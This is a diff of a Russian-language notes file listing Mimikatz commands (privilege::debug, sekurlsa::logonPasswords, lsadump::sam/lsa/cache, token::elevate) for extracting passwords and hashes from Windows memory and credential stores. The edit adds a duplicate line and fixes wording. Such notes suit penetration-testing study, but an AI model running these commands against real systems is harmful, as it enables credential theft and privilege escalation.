@@ -22,12 +22,13 @@ lsadump::sam /system:C:\Share-Server\files\SYSTEM /sam:C:\Share-Server\files\SAM
 После запуска Mimikatz можно использовать следующие команды для вытягивания паролей из памяти Windows:
 
 - `privilege::debug` - открывает привилегии отладки для текущего процесса.
+- token::elevate - повышение привелегий
 - `sekurlsa::logonPasswords` - выводит введенные пользователем логины и хэши паролей.
 - `lsadump::sam` - вытягивает пароли из базы данных SAM.
 - `lsadump::lsa` - вытягивает хэши паролей из дискового хранилища LSA.
 - `token::elevate` - поднимает привилегии на максимальный уровень.
 - `token::whoami` - выводит информацию о текущем пользователе.
--  lsadump::cache - mscash2 последних 10 пользователей и систем и секьюрити
+-  lsadump::cache - mscash2 последних 10 пользователей из систем и секьюрити
 
 Подробнее: https://www.securitylab.ru/analytics/517178.php
 
